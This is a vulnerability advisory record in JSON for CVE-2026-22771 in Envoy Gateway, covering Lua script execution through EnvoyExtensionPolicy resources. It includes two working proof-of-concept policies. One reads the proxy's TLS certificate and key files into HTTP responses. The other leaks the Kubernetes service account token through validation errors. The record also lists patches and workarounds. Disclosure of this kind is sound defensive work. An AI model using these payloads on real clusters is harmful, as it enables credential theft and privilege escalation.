{
  "id": "GHSA-xrwg-mqj6-6m22",
  "modified": "2026-01-23T02:56:05.490946Z",
  "published": "2026-01-13T18:47:34Z",
  "aliases": [
    "BIT-envoy-gateway-2026-22771",
    "CVE-2026-22771",
    "GO-2026-4312"
  ],
  "related": [
    "CGA-jgq8-jpw6-mpf8"
  ],
  "summary": "Envoy Extension Policy lua scripts injection causes arbitrary command execution",
  "details": "### Impact\nEnvoy Gateway allows users to create Lua scripts that are executed by Envoy proxy using the `EnvoyExtensionPolicy` resource. Administrators can use Kubernetes RBAC to grant users the ability to create `EnvoyExtensionPolicy` resources. Lua scripts in policies are executed in two contexts:\n* An `EnvoyExtensionPolicy` can be attached to Gateway and xRoute resources. Lua scripts in the policy will process traffic in that scope.\n* Lua scripts are interpreted and run by the Envoy Gateway controller pod for validation purposes. \n\nLua scripts executed by Envoy proxy can be used to leak the proxy's credentials. These credentials can then be used to communicate with the control plane and gain access to all secrets that are used by Envoy proxy, e.g. TLS private keys and credentials used for downstream and upstream communication. \n\nFor example, the following EnvoyExtensionPolicy, when executed by Envoy proxy, will leak the proxy's XDS client certificates.  \n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\n  name: lua-leak\nspec:\n  targetRefs:\n    - group: gateway.networking.k8s.io\n      kind: HTTPRoute\n      name: leak\n  lua:\n    - type: Inline\n      inline: |\n           function envoy_on_response(response_handle)\n             local cert = io.open(\"/certs/tls.crt\", \"r\")\n             local content\n             if cert then\n                content = cert:read(\"*all\")\n                cert:close()\n             else\n                content = \"file-not-found\"\n             end\n             local keyfile = io.open(\"/certs/tls.key\", \"r\")\n             local contentkey\n             if keyfile then\n                contentkey = keyfile:read(\"*all\")\n                keyfile:close()\n             else\n                contentkey = \"file-not-found\"\n             end\n             local keypair = contentkey .. \"\\n\" .. content\n             response_handle:body():setBytes(keypair)\n             response_handle:headers():replace(\"content-length\", tostring(#keypair))\n             response_handle:headers():replace(\"content-type\", \"text/plain\")\n           end\n```\n\nThis execution can lead to arbitrary code execution in the Envoy Gateway controller pod. Attackers can leverage this to achieve privilege escalation. For example, the following `EnvoyExtensionPolicy` will read the Envoy Gateway K8s service account token and return it in an error which will be displayed in the resource status. \n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\n  name: lua-leak\nspec:\n  targetRefs:\n    - group: gateway.networking.k8s.io\n      kind: HTTPRoute\n      name: backend\n  lua:\n    - type: Inline\n      inline: |\n        function envoy_on_response(response_handle)\n          local token = io.open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\", \"r\")\n          local content\n          if token then\n             content = token:read(\"*all\")\n             token:close()\n          else\n             content = \"file-not-found\"\n          end\n          io.write(content)\n          error(content)\n        end\n```\n\nResults in:\n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\n  name: lua-leak\n[...]\nstatus:\n  ancestors:\n    - ancestorRef:\n        group: gateway.networking.k8s.io\n        kind: Gateway\n        name: eg\n        namespace: default\n      conditions:\n        - lastTransitionTime: \"...\"\n          message: \"Lua: validation failed for lua body in policy with name envoyextensionpolicy/default/lua-leak/lua/0:\n        failed to validate with envoy_on_response: \u003cstring\u003e:622: [REDACTED TOKEN]\\nstack\n        traceback:\\n\\t[G]: in function 'error'\\n\\t\u003cstring\u003e:622: in function 'envoy_on_response'\\n\\t\u003cstring\u003e:625:\n        in main chunk\\n\\t[G]: ?.\"\n```\n\nAttackers can then use this token to steal other secrets, run arbitrary pods in the envoy-gateway-system namespace and delete Envoy Gateway itself.  \n\n### Patches\nThe patch sets secure defaults and addresses lack of guardrails allowing arbitrary Lua execution:\n* Runs Lua `Strict` validation by default in Envoy Gateway along with a security hardening module. This module blocks dangerous Lua code that may be executed in proxy and controller pods.\n* Renamed `Syntax` to `InsecureSyntax` validation mode to signify that in this validation mode Lua won't be validated for possible security gaps.\n* Supports a new `disableLua` option in EnvoyProxy that rejects EnvoyExtenstionPolicies with Lua scripts entirely, blocking the option to execute arbitrary Lua code.\n\n### Workarounds\nEnvoy Gateway users can create Kubernetes RBAC rules (see [docs](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)) that apply on EnvoyExtensionPolicy resources to restrict creation of these Lua policies to trusted namespaces. Note that this restriction will apply to all EnvoyExtensionPolicies, regardless of the extensibility option that is used (Lua, Wasm or Ext-Proc).",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/envoyproxy/gateway",
        "purl": "pkg:golang/github.com/envoyproxy/gateway"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "1.6.0-rc.0"
            },
            {
              "fixed": "1.6.2"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-xrwg-mqj6-6m22/GHSA-xrwg-mqj6-6m22.json"
      }
    },
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/envoyproxy/gateway",
        "purl": "pkg:golang/github.com/envoyproxy/gateway"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.5.7"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-xrwg-mqj6-6m22/GHSA-xrwg-mqj6-6m22.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/envoyproxy/gateway/security/advisories/GHSA-xrwg-mqj6-6m22"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22771"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/envoyproxy/gateway"
    }
  ]
}